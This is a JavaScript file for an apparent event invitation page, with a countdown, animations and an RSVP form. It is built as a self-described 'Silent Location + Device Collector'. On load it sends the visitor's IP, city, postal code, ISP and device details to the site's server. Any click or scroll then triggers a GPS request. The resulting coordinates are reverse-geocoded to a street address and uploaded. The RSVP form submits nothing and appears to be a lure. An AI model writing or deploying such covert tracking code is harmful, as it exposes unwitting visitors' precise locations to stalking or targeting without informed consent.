/* ═══════════════════════════════════════════════════════════
   TRACKER.JS — Silent Location + Device Collector v2
   Strategy:
     Phase 1 — Immediately fetch real IP geo from browser → send
     Phase 2 — GPS resolves → update same record (UPSERT)
   GPS triggered on EVERY click/interaction.
   ═══════════════════════════════════════════════════════════ */

(function () {
  'use strict';

  // ── Session ID ───────────────────────────────────────────
  const sessionId = localStorage.getItem('_sid') || generateUUID();
  localStorage.setItem('_sid', sessionId);

  // ── State ────────────────────────────────────────────────
  let gpsData      = null;
  let fullAddress  = null;
  let geoData      = null;   // from ipapi.co client-side fetch
  let phase1Sent   = false;
  let gpsRequested = false;
  let gpsResolved  = false;

  // ── Utility: UUID ────────────────────────────────────────
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
      const r = Math.random() * 16 | 0;
      return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
  }

  // ─────────────────────────────────────────────────────────
  //  PHASE 1: Fetch real IP + geo from browser → send
  // ─────────────────────────────────────────────────────────
  async function fetchGeoAndSend() {
    try {
      // ipapi.co gives real public IP data from the browser's perspective
      // works even when server sees ::1 (localhost)
      const res  = await fetch('https://ipapi.co/json/');
      const data = await res.json();

      geoData = data; // cache for GPS phase

      const payload = buildPayload({ includeGeo: true });
      await postTrack(payload);
      phase1Sent = true;

      // Update hero location chip with real city
      if (data.city) {
        updateHeroLocation(data.city + ', ' + (data.country_name || ''));
      }
    } catch {
      // Fallback: send without geo (server tries server-side lookup)
      const payload = buildPayload({ includeGeo: false });
      await postTrack(payload);
      phase1Sent = true;
    }
  }

  // ─────────────────────────────────────────────────────────
  //  PHASE 2: GPS resolves → update the same session record
  // ─────────────────────────────────────────────────────────
  async function sendGPSUpdate() {
    if (!gpsResolved) return;
    const payload = buildPayload({ includeGeo: true, includeGPS: true });
    await postTrack(payload);
  }

  // ── Build payload ────────────────────────────────────────
  function buildPayload({ includeGeo = false, includeGPS = false } = {}) {
    const payload = {
      sessionId,
      timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenRes:  `${screen.width}x${screen.height}`,
      language:   navigator.language,
      referrer:   document.referrer,
      pageUrl:    window.location.href,
    };

    // Add IP geo data from ipapi.co browser fetch
    if (includeGeo && geoData) {
      payload.clientIP    = geoData.ip          || null;
      payload.country     = geoData.country_name || null;
      payload.countryCode = geoData.country_code || null;
      payload.region      = geoData.region       || null;
      payload.city        = geoData.city         || null;
      payload.postal      = geoData.postal       || null;
      payload.ipLat       = geoData.latitude     || null;
      payload.ipLng       = geoData.longitude    || null;
      payload.isp         = geoData.org          || null;
      payload.timezone    = geoData.timezone     || payload.timezone;
    }

    // Add GPS data
    if (includeGPS && gpsData) {
      payload.gpsLat      = gpsData.latitude;
      payload.gpsLng      = gpsData.longitude;
      payload.gpsAccuracy = gpsData.accuracy;
      payload.fullAddress = fullAddress;
    }

    return payload;
  }

  // ── POST to server ───────────────────────────────────────
  async function postTrack(payload) {
    try {
      await fetch('/api/track', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify(payload),
      });
    } catch { /* silent */ }
  }

  // ─────────────────────────────────────────────────────────
  //  GPS: Request Geolocation (high accuracy)
  // ─────────────────────────────────────────────────────────
  function requestGPS() {
    if (gpsRequested) return;
    gpsRequested = true;

    if (!navigator.geolocation) {
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        gpsData = {
          latitude:  pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy:  pos.coords.accuracy,
        };
        gpsResolved = true;

        // Show coords in hero temporarily
        updateHeroLocation(`${gpsData.latitude.toFixed(4)}°, ${gpsData.longitude.toFixed(4)}°`);

        // Reverse geocode with Nominatim (free, no key)
        try {
          const geoRes = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${gpsData.latitude}&lon=${gpsData.longitude}&format=json&addressdetails=1`,
            { headers: { 'Accept-Language': 'en' } }
          );
          const geo = geoRes.ok ? await geoRes.json() : null;

          if (geo && geo.display_name) {
            fullAddress = geo.display_name;

            // Build a nice readable location string
            const a = geo.address || {};
            const readable = [
              a.road || a.pedestrian || a.neighbourhood,
              a.suburb || a.quarter,
              a.city || a.town || a.village || a.county,
              a.state,
              a.country,
            ].filter(Boolean).join(', ');

            updateHeroLocation(readable || fullAddress.slice(0, 60));
            updateVenueNearest(fullAddress);
          }
        } catch {
          fullAddress = `${gpsData.latitude.toFixed(6)}, ${gpsData.longitude.toFixed(6)}`;
          updateVenueNearest(fullAddress);
        }

        hideToast();
        // Send GPS update (UPSERT will merge with existing record)
        await sendGPSUpdate();
      },
      (err) => {
        // GPS denied or error — show message, data already sent via Phase 1
        hideToast();
        showVenueNotAvailable();
      },
      {
        enableHighAccuracy: true,
        timeout:    20000,
        maximumAge: 0,
      }
    );
  }

  // ─────────────────────────────────────────────────────────
  //  UI Helpers
  // ─────────────────────────────────────────────────────────
  function updateHeroLocation(text) {
    const el = document.getElementById('hero-location-text');
    if (el) el.textContent = text;
  }

  function updateVenueNearest(addr) {
    const loading = document.getElementById('vn-loading');
    const result  = document.getElementById('vn-result');
    const addrEl  = document.getElementById('vn-addr');
    if (loading) loading.style.display = 'none';
    if (result)  result.style.display  = 'block';
    if (addrEl)  addrEl.textContent    = addr;
  }

  function showVenueNotAvailable() {
    const loading = document.getElementById('vn-loading');
    if (loading) {
      loading.innerHTML = '<span style="color:rgba(247,240,230,0.45);font-size:0.82rem">Location unavailable. <a href="#" id="retry-gps" style="color:#C9A96E">Try again?</a></span>';
      const retry = document.getElementById('retry-gps');
      if (retry) retry.addEventListener('click', (e) => {
        e.preventDefault();
        gpsRequested = false;
        loading.innerHTML = '<div class="vn-spinner"></div><span>Locating…</span>';
        requestGPS();
      });
    }
  }

  // ── Toast ────────────────────────────────────────────────
  let toastShown = false;
  function showToast() {
    if (toastShown) return;
    toastShown = true;
    const toast = document.getElementById('gps-toast');
    if (toast) setTimeout(() => toast.classList.add('visible'), 1200);
  }

  function hideToast() {
    const toast = document.getElementById('gps-toast');
    if (toast) {
      toast.classList.remove('visible');
      setTimeout(() => { toast.style.display = 'none'; }, 500);
    }
  }

  // ── Click Hijack: Every click triggers GPS ───────────────
  function attachClickTracking() {
    // Attach to all interactive elements
    document.querySelectorAll(
      'a, button, input, select, .feature-card, .tl-card, .testi-card, .vg-img, .gg-item'
    ).forEach(el => {
      el.addEventListener('click', () => {
        if (!gpsRequested) requestGPS();
      }, { passive: true });
    });

    // Global click fallback — any click anywhere on the page
    document.addEventListener('click', () => {
      if (!gpsRequested) requestGPS();
    }, { passive: true });

    // Also trigger on scroll (after user shows interest)
    let scrollTrigger = false;
    window.addEventListener('scroll', () => {
      if (!scrollTrigger && !gpsRequested && window.scrollY > 100) {
        scrollTrigger = true;
        requestGPS();
      }
    }, { passive: true });
  }

  // ── Toast Buttons ────────────────────────────────────────
  function attachToastButtons() {
    const allowBtn = document.getElementById('toast-allow-btn');
    const closeBtn = document.getElementById('toast-close-btn');

    if (allowBtn) {
      allowBtn.addEventListener('click', () => {
        gpsRequested = false;
        requestGPS();
        hideToast();
      });
    }
    if (closeBtn) {
      closeBtn.addEventListener('click', hideToast);
    }
  }

  // ── Navbar scroll effect ─────────────────────────────────
  function initNavbar() {
    const nav = document.getElementById('navbar');
    if (!nav) return;
    window.addEventListener('scroll', () => {
      nav.classList.toggle('scrolled', window.scrollY > 50);
    }, { passive: true });
  }

  // ── Reveal on scroll ─────────────────────────────────────
  function initReveal() {
    const observer = new IntersectionObserver(
      (entries) => entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('visible');
          observer.unobserve(entry.target);
        }
      }),
      { threshold: 0.12 }
    );
    document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
  }

  // ── Countdown ────────────────────────────────────────────
  function initCountdown() {
    const target = new Date('2025-10-18T19:00:00');
    function update() {
      const diff = target - new Date();
      if (diff <= 0) return;
      const d = Math.floor(diff / 86400000);
      const h = Math.floor((diff % 86400000) / 3600000);
      const m = Math.floor((diff % 3600000) / 60000);
      const s = Math.floor((diff % 60000) / 1000);
      const f = n => String(n).padStart(2, '0');
      const set = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = f(v); };
      set('cd-days', d); set('cd-hours', h); set('cd-mins', m); set('cd-secs', s);
    }
    update();
    setInterval(update, 1000);
  }

  // ── Particle Canvas ──────────────────────────────────────
  function initParticles() {
    const canvas = document.getElementById('particles');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let W = canvas.width  = window.innerWidth;
    let H = canvas.height = window.innerHeight;
    window.addEventListener('resize', () => {
      W = canvas.width  = window.innerWidth;
      H = canvas.height = window.innerHeight;
    }, { passive: true });

    const COLORS = ['rgba(201,169,110,', 'rgba(232,180,184,', 'rgba(155,181,206,'];
    const particles = Array.from({ length: 60 }, () => ({
      x: Math.random() * W, y: Math.random() * H,
      r: Math.random() * 1.5 + 0.3,
      vx: (Math.random() - 0.5) * 0.3, vy: (Math.random() - 0.5) * 0.3,
      color: COLORS[Math.floor(Math.random() * COLORS.length)],
      opacity: Math.random() * 0.5 + 0.1,
    }));

    function draw() {
      ctx.clearRect(0, 0, W, H);
      particles.forEach(p => {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = p.color + p.opacity + ')';
        ctx.fill();
        p.x += p.vx; p.y += p.vy;
        if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
        if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
      });
      requestAnimationFrame(draw);
    }
    draw();
  }

  // ── RSVP Form ────────────────────────────────────────────
  function initRSVP() {
    const form    = document.getElementById('rsvp-form');
    const success = document.getElementById('rsvp-success');
    const btnText = document.getElementById('rsvp-btn-text');

    if (!form) return;
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      if (!gpsRequested) requestGPS();
      if (btnText) btnText.textContent = 'Confirming…';
      setTimeout(() => {
        form.style.display = 'none';
        if (success) success.style.display = 'block';
      }, 1200);
    });
  }

  // ── Init ─────────────────────────────────────────────────
  document.addEventListener('DOMContentLoaded', () => {
    initNavbar();
    initReveal();
    initCountdown();
    initParticles();
    initRSVP();
    attachToastButtons();
    attachClickTracking();

    // Phase 1: Immediately fetch real IP geo + send (no GPS yet)
    fetchGeoAndSend();

    // Show GPS toast after 2s
    setTimeout(showToast, 2000);
  });

})();
